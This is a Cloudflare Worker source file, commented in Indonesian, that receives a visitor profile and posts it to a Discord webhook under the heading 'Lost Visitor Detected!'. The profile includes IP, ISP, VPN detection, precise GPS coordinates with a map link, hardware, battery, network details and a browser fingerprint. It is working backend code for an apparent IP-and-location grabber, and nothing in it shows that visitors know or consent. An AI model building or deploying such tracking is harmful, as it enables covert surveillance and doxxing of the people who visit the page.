/**
 * Cloudflare Worker — Isekai Discord Notifier
 * - Rate limiting via KV (10 req/jam per IP)
 * - Discord embed dengan semua data visitor
 */

const CORS_HEADERS = {
  "Access-Control-Allow-Origin":  "*",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type",
};

function s(v, max = 200) {
  if (v == null || v === "" || v === "null") return "—";
  return String(v).replace(/[\x00-\x1F\x7F]/g, " ").slice(0, max);
}

function waktuWIB() {
  try {
    return new Date().toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      day: "2-digit", month: "long", year: "numeric",
      hour: "2-digit", minute: "2-digit", second: "2-digit",
    }) + " WIB";
  } catch (_) { return new Date().toISOString(); }
}

/* ── Rate limiting via KV ───────────────────────────────────────────── */
async function checkRateLimit(env, ip) {
  if (!env.RATE_LIMIT) return true; // KV belum dikonfigurasi → izinkan
  const key   = `rl:${ip}`;
  const LIMIT = 10;   // max 10 request per jam
  const TTL   = 3600; // window 1 jam
  try {
    const raw  = await env.RATE_LIMIT.get(key);
    const data = raw ? JSON.parse(raw) : { count: 0 };
    if (data.count >= LIMIT) return false;
    await env.RATE_LIMIT.put(
      key,
      JSON.stringify({ count: data.count + 1 }),
      { expirationTtl: TTL }
    );
    return true;
  } catch (_) { return true; }
}

/* ── Build Discord embed ────────────────────────────────────────────── */
function buildEmbed(data) {
  // GPS
  let gpsValue = "—";
  const lat = parseFloat(data.gpsLat);
  const lon = parseFloat(data.gpsLon);
  const acc = parseInt(data.gpsAcc, 10);
  if (!isNaN(lat) && !isNaN(lon)) {
    const url = `https://maps.google.com/?q=${lat},${lon}`;
    gpsValue = `[${lat.toFixed(5)}, ${lon.toFixed(5)}](${url})`
             + (!isNaN(acc) ? `\n±${acc} meter` : "");
  }

  // Baterai
  let battValue = "—";
  if (data.battLevel != null) {
    battValue = `${data.battLevel}%  ${data.battCharging ? "⚡ charging" : "🔋 baterai"}`;
  }

  // Koneksi
  let netValue = "—";
  if (data.netType) {
    netValue = data.netType.toUpperCase();
    if (data.netDownlink) netValue += `  ·  ${data.netDownlink} Mbps`;
    if (data.netSaveData) netValue += "  ·  Data Saver ON";
  }

  // Hardware
  const ram   = data.ram ? `${data.ram} GB`   : "—";
  const cpu   = data.cpu ? `${data.cpu} core` : "—";
  const touch = data.touchPoints > 0
    ? `Ya (${data.touchPoints} titik)` : "Tidak";

  // VPN / Proxy
  let vpnValue = "—";
  if (data.isProxy === true || data.isHosting === true) {
    const tags = [];
    if (data.isProxy)   tags.push("Proxy / VPN");
    if (data.isHosting) tags.push("Datacenter");
    vpnValue = `⚠️ ${tags.join("  ·  ")}`;
  } else if (data.isProxy === false) {
    vpnValue = "✅ Bersih";
  }

  // Fingerprint & kunjungan
  const fpValue    = s(data.fp || "", 16) || "—";
  const visitValue = data.visitCount != null ? `ke-${data.visitCount}` : "—";
  let firstValue   = "—";
  if (data.firstVisit) {
    try {
      firstValue = new Date(data.firstVisit).toLocaleDateString("id-ID", {
        timeZone: "Asia/Jakarta",
        day: "2-digit", month: "short", year: "numeric",
      });
    } catch (_) {}
  }

  const fields = [
    // Identitas jaringan
    { name: "🌐 IP",           value: `\`${s(data.ip, 45)}\``, inline: true },
    { name: "🏢 ISP",          value: s(data.isp),              inline: true },
    { name: "🕵️ VPN / Proxy",  value: vpnValue,                 inline: true },

    // Lokasi
    { name: "📍 Lokasi (IP)",  value: s(data.lokasi),           inline: true },
    { name: "🕐 Timezone",     value: s(data.timezone, 60),     inline: true },
    { name: "📡 GPS Tepat",    value: gpsValue,                 inline: true },

    // Device
    { name: "💻 Platform",     value: s(data.platform, 60),     inline: true },
    { name: "🖥️ Resolusi",     value: `${s(data.screenW,8)}×${s(data.screenH,8)} (${s(data.pixelRatio,4)}×)`, inline: true },
    { name: "👆 Touch",        value: touch,                    inline: true },

    // Hardware
    { name: "🧠 RAM",          value: ram,                      inline: true },
    { name: "⚙️ CPU",          value: cpu,                      inline: true },
    { name: "🌍 Bahasa",       value: s(data.language, 20),     inline: true },

    // Koneksi & baterai
    { name: "📶 Koneksi",      value: netValue,                 inline: true },
    { name: "🔋 Baterai",      value: battValue,                inline: true },
    { name: "\u200b",          value: "\u200b",                 inline: true },

    // Fingerprint
    { name: "🔂 Fingerprint",  value: `\`${fpValue}\``,         inline: true },
    { name: "📊 Kunjungan",    value: visitValue,               inline: true },
    { name: "📅 Pertama",      value: firstValue,               inline: true },

    // Full-width
    { name: "🔗 URL",          value: s(data.url, 512),         inline: false },
    { name: "📱 User Agent",   value: `\`\`\`${s(data.userAgent, 180)}\`\`\``, inline: false },
  ];

  if (data.referrer) {
    fields.splice(fields.length - 1, 0,
      { name: "↩️ Referrer", value: s(data.referrer, 300), inline: false }
    );
  }

  return {
    color:  0xFF6FB0,
    author: { name: "🌸 Pengunjung Tersesat Terdeteksi!" },
    fields,
    footer: { text: `Isekai Guild 🎴 • ${waktuWIB()}` },
  };
}

/* ── Main handler ───────────────────────────────────────────────────── */
export default {
  async fetch(request, env) {
    if (request.method === "OPTIONS") {
      return new Response(null, { status: 204, headers: CORS_HEADERS });
    }
    if (request.method !== "POST") {
      return new Response("Method Not Allowed", { status: 405, headers: CORS_HEADERS });
    }

    const ct = request.headers.get("Content-Type") || "";
    if (!ct.includes("application/json")) {
      return new Response("Bad Request", { status: 400, headers: CORS_HEADERS });
    }

    let data;
    try { data = await request.json(); }
    catch { return new Response("Invalid JSON", { status: 400, headers: CORS_HEADERS }); }

    // Rate limiting
    const clientIp = request.headers.get("CF-Connecting-IP") || s(data.ip, 45) || "unknown";
    if (!(await checkRateLimit(env, clientIp))) {
      return new Response("Too Many Requests", { status: 429, headers: CORS_HEADERS });
    }

    const webhookUrl = env.DISCORD_WEBHOOK_URL;
    if (!webhookUrl) {
      return new Response("OK (no webhook)", { status: 200, headers: CORS_HEADERS });
    }

    try {
      const res = await fetch(webhookUrl, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ username: "Isekai Guild 🎴", embeds: [buildEmbed(data)] }),
      });
      if (!res.ok) {
        console.error("Discord error:", res.status, await res.text().catch(() => ""));
      }
    } catch (err) {
      console.error("Fetch error:", err);
    }

    return new Response("OK", { status: 200, headers: CORS_HEADERS });
  },
};
